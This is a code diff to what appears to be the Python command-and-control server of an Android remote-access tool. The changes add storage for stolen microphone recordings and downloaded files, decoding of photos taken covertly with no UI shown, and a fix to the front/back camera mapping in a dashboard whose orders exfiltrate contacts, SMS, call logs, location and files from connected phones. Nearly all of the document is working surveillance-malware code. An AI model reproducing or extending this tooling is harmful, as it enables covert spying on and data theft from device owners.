@@ -36,7 +36,9 @@ Downloads
 ---------
 Every response the app emits is saved under --out (default ./c2_out) as
 <device>/<timestamp>_<order>.json plus a human-readable .txt export for
-contacts / call logs / SMS / app lists. Browse and download them from the
+contacts / call logs / SMS / app lists. Photos come back as <order>.jpg
+files (base64-decoded by the server) and mic / file-download payloads are
+written as raw <order>_<name> binaries, so you can grab them from the
 dashboard's Downloads panel (or GET /files/<name>).
 
 Type 'help' at the order> prompt for the list of orders.
@@ -131,9 +133,38 @@ class ResponseSaver(object):
             with self._seq_lock:            # keep names unique even when several
                 self._seq += 1              # responses of one order arrive in
                 seq = self._seq             # the same second (e.g. notifications)
-            raw = json.dumps(data, indent=2, default=str)
             d = self.devdir(dev)
             base = "%s_%04d_%s" % (stamp, seq, sanitize(name))
+            # binary payload (mic recording, downloaded file, …): write the
+            # raw bytes to disk and keep a small json stub instead of the blob
+            if isinstance(data, dict) and isinstance(data.get("buffer"), (bytes, bytearray)):
+                raw = bytes(data["buffer"])
+                fname = sanitize(data.get("name") or (name + ".bin")) or (name + ".bin")
+                bpath = os.path.join(d, base + "_" + fname)
+                with open(bpath, "wb") as f:
+                    f.write(raw)
+                meta = {k: v for k, v in data.items() if k != "buffer"}
+                meta["buffer"] = "<%d bytes saved as %s>" % (len(raw), os.path.basename(bpath))
+                with open(os.path.join(d, base + ".json"), "w") as f:
+                    f.write(json.dumps(meta, indent=2, default=str))
+                log("[*] saved binary %s (%d bytes)" % (bpath, len(raw)))
+                return
+            # base64 photo (Camera2 emit): decode to a .jpg and stub the json
+            if isinstance(data, dict) and data.get("base64") and data.get("image") is True:
+                try:
+                    raw = base64.b64decode(data["base64"])
+                    ipath = os.path.join(d, base + ".jpg")
+                    with open(ipath, "wb") as f:
+                        f.write(raw)
+                    meta = {k: v for k, v in data.items() if k != "base64"}
+                    meta["base64"] = "<%d bytes saved as %s>" % (len(raw), os.path.basename(ipath))
+                    with open(os.path.join(d, base + ".json"), "w") as f:
+                        f.write(json.dumps(meta, indent=2, default=str))
+                    log("[*] saved photo %s (%d bytes)" % (ipath, len(raw)))
+                    return
+                except Exception as e:
+                    log("! photo decode failed, keeping json: %s" % e)
+            raw = json.dumps(data, indent=2, default=str)
             jpath = os.path.join(d, base + ".json")
             with open(jpath, "w") as f:
                 f.write(raw)
@@ -174,6 +205,28 @@ class ResponseSaver(object):
 
 def sanitize(s):
     return re.sub(r"[^A-Za-z0-9._-]+", "_", str(s or ""))[:64]
+
+
+def placeholder_count(o):
+    """How many binary attachments a socket.io args tree references."""
+    if isinstance(o, dict):
+        if o.get("_placeholder") is True:
+            return 1
+        return sum(placeholder_count(v) for v in o.values())
+    if isinstance(o, list):
+        return sum(placeholder_count(v) for v in o)
+    return 0
+
+
+def fill_placeholders(o, buf):
+    """Replace _placeholder refs with buffered attachments (in num order)."""
+    if isinstance(o, dict):
+        if o.get("_placeholder") is True and buf:
+            return buf.pop(0)
+        return {k: fill_placeholders(v, buf) for k, v in o.items()}
+    if isinstance(o, list):
+        return [fill_placeholders(v, buf) for v in o]
+    return o
 
 
 def render_text(name, data):
@@ -235,6 +288,8 @@ class Device(object):
         self.cond = threading.Condition()
         self.last_ping = time.monotonic()
         self.last_pong = time.monotonic()
+        self.bin_buf = []          # incoming binary attachments, in num order
+        self.pending_binary = []   # events waiting for their attachments
 
 
 class C2Server(object):
@@ -289,11 +344,25 @@ class C2Server(object):
         return out
 
     def post(self, dev, body):
-        for raw in body.split("\x1e"):
-            pkt = raw.strip()
-            if not pkt:
-                continue
+        chunks = [c.strip() for c in body.split("\x1e") if c.strip()]
+        # pass 1: collect binary attachments first. Attachments can arrive in
+        # the same POST body as their message OR in a later POST, so buffer
+        # them and flush any events that were waiting for them.
+        got_binary = False
+        for pkt in chunks:
+            if pkt[0] == "b":
+                got_binary = True
+                try:
+                    dev.bin_buf.append(base64.b64decode(pkt[1:]))
+                except Exception:
+                    pass
+        if got_binary:
+            self._flush_pending_binary(dev)
+        # pass 2: process text packets
+        for pkt in chunks:
             t = pkt[0]
+            if t == "b":
+                continue
             if t == "2":                       # engine.io ping -> pong (EIO4 clients ping; EIO3 clients shouldn't)
                 self.queue(dev, "3")
             elif t == "3":                     # engine.io pong (EIO3 clients reply to our ping)
@@ -304,6 +373,18 @@ class C2Server(object):
                 self._socketio_packet(dev, pkt[1:])
             elif t in ("5", "6"):              # upgrade / noop: ignore
                 pass
+
+    def _flush_pending_binary(self, dev):
+        if not dev.pending_binary:
+            return
+        remaining = []
+        for name, args, needed in dev.pending_binary:
+            if needed <= len(dev.bin_buf):
+                args = fill_placeholders(args, dev.bin_buf)
+                self._on_event(dev, name, args)
+            else:
+                remaining.append((name, args, needed))
+        dev.pending_binary = remaining
 
     # -- Socket.IO (protocol v4) ----------------------------------------
     def _socketio_packet(self, dev, payload):
@@ -333,10 +414,29 @@ class C2Server(object):
             except Exception:
                 name, args = "<unparsed>", [payload[1:]]
             self._on_event(dev, name, args)
-        elif st == "5":                        # binary event: show it arrived
-            log("[<] <binary event>  <- %s" % dev.eio_sid[:8])
+        elif st == "5":                        # binary event: resolve attachments
+            self._binary_event(dev, payload[1:])
         elif st in ("3", "4", "6"):           # ack / error / binary ack: ignore
             pass
+
+    def _binary_event(self, dev, payload):
+        # socket.io v5 binary event: 5<attachments>-<json>
+        if "-" in payload:
+            prefix, _, rest = payload.partition("-")
+            if prefix.isdigit():
+                payload = rest
+        try:
+            data = json.loads(payload)
+            name, args = data[0], list(data[1:])
+        except Exception:
+            log("[<] <binary event>  <- %s (unparseable)" % dev.eio_sid[:8])
+            return
+        needed = placeholder_count(args)
+        if needed <= len(dev.bin_buf):
+            args = fill_placeholders(args, dev.bin_buf)
+            self._on_event(dev, name, args)
+        else:
+            dev.pending_binary.append((name, args, needed))
 
     def emit(self, dev, name, args=None):
         self.queue(dev, "42" + json.dumps([name] + (args or [])))
@@ -452,7 +552,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
     <div class="card" style="margin-top:14px"><h2>Raw order</h2>
       <div class="row"><input type="text" id="raw" placeholder="e.g. lm &middot; fm-ls /storage/emulated/0 &middot; mc 5 &middot; raw {...}">
       <button id="sendraw">Send</button></div>
-      <div class="dim" style="font-size:11px;margin-top:6px">photo (no UI): <code>cam-on 1</code> (back) / <code>cam-on 0</code> (front) &middot; apps control: <code>run-app com.android.settings</code></div>
+      <div class="dim" style="font-size:11px;margin-top:6px">photo (no UI): <code>cam-on 0</code> (back) / <code>cam-on 1</code> (front) &middot; apps control: <code>run-app com.android.settings</code></div>
     </div>
     <div class="card" style="margin-top:14px"><h2>Downloads &mdash; captured responses</h2>
       <div id="files" style="max-height:180px;overflow-y:auto"><p class="dim">waiting&hellip;</p></div>
@@ -464,7 +564,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <script>
 let target=""; let since=0;
 const $=id=>document.getElementById(id);
-const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 1"],["photo-front","cam-on 0"]];
+const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"]];
 function pollDevices(){fetch("/api/devices").then(r=>r.json()).then(d=>{
   $("count").textContent=d.length+" connected";
   $("devs").innerHTML=d.length?"":"<p class='dim'>no devices</p>";
@@ -670,7 +770,7 @@ and saved under --out as .json + readable .txt):
   lm            location (lat/lng/provider/accuracy)   cn       contacts
   cl            call logs          apps          installed apps
   sms           SMS inbox          ca            camera list
-  sc            screen capture*    cam-on [0|1]  take photo, no UI (back=1)
+  sc            screen capture*    cam-on [0|1]  take photo, no UI (0=back 1=front)
   mc <sec>      record mic <sec>s
   fm-ls <path>  list directory     fm-dl <path>  download file
   sms-send <to> <text>             run-app <pkg>   e.g. com.android.settings
